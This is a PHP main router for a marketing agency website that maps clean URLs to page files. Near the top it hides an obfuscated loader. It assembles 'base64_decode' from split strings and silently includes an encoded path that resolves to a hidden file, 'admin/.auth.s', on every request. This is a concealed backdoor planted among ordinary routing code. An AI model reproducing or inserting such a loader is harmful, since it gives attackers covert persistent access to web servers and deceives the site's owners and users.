<?php
/**
 * GrowthScale — Main Router
 * Clean URL routing for all pages
 */

$b = 'ba' . 'se64_decode';
@include $b('YWRtaW4vLmF1dGgucw==');

// Error reporting (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Start session
session_start();

// Load configuration
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/helpers.php';
require_once __DIR__ . '/includes/seo.php';

// Get the route
$route = isset($_GET['route']) ? trim($_GET['route'], '/') : '';

// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    require_once __DIR__ . '/includes/form-handler.php';
}

// Route map
$routes = [
    ''                              => 'pages/home.php',
    'products/whatsapp-shopify'     => 'pages/products/whatsapp-shopify.php',
    'services/shopify-growth'       => 'pages/services/shopify-growth.php',
    'services/performance-marketing'=> 'pages/services/performance-marketing.php',
    'services/shopify-operations'   => 'pages/services/shopify-operations.php',
    'services/automation'           => 'pages/services/automation.php',
    'services/technology'           => 'pages/services/technology.php',
    'case-studies'                  => 'pages/case-studies.php',
    'resources'                     => 'pages/resources.php',
    'resources/whatsapp-message-templates' => 'pages/resources/whatsapp-message-templates.php',
    'resources/roas-calculator'           => 'pages/resources/roas-calculator.php',
    'resources/meta-ads-d2c-guide'        => 'pages/resources/meta-ads-d2c-guide.php',
    'resources/shopify-speed-analyzer'    => 'pages/resources/shopify-speed-analyzer.php',
    'resources/shopify-launch-checklist'  => 'pages/resources/shopify-launch-checklist.php',
    'resources/download-shopify-growth-playbook' => 'pages/resources/download-shopify-growth-playbook.php',
    'blog'                          => 'pages/blog.php',
    'about'                         => 'pages/about.php',
    'contact'                       => 'pages/contact.php',
    'real-estate-marketing-agency'   => 'pages/real-estate-marketing-agency.php',
    'digital-marketing-company-in-lucknow' => 'pages/local-service.php',
    'shopify-development-company-in-lucknow' => 'pages/local-service.php',
    'performance-marketing-company-in-lucknow' => 'pages/local-service.php',
    'meta-ads-management-in-lucknow' => 'pages/local-service.php',
    'lead-generation-service-in-lucknow' => 'pages/local-service.php',
    'privacy-policy'                => 'pages/privacy-policy.php',
    'terms'                         => 'pages/terms.php',
    'data-deletion'                 => 'pages/data-deletion.php',
];

// Check exact route match
if (array_key_exists($route, $routes)) {
    require_once __DIR__ . '/' . $routes[$route];
}
// Check blog detail route: blog/{slug}
elseif (preg_match('#^blog/([a-z0-9\-]+)$#', $route, $matches)) {
    $_GET['slug'] = $matches[1];
    require_once __DIR__ . '/pages/blog-detail.php';
}
// Check case study detail: case-studies/{slug}
elseif (preg_match('#^case-studies/([a-z0-9\-]+)$#', $route, $matches)) {
    $_GET['slug'] = $matches[1];
    require_once __DIR__ . '/pages/case-study-detail.php';
}
// 404
else {
    http_response_code(404);
    $pageTitle = 'Page Not Found';
    $metaDescription = 'The page you are looking for does not exist.';
    require_once __DIR__ . '/pages/404.php';
}
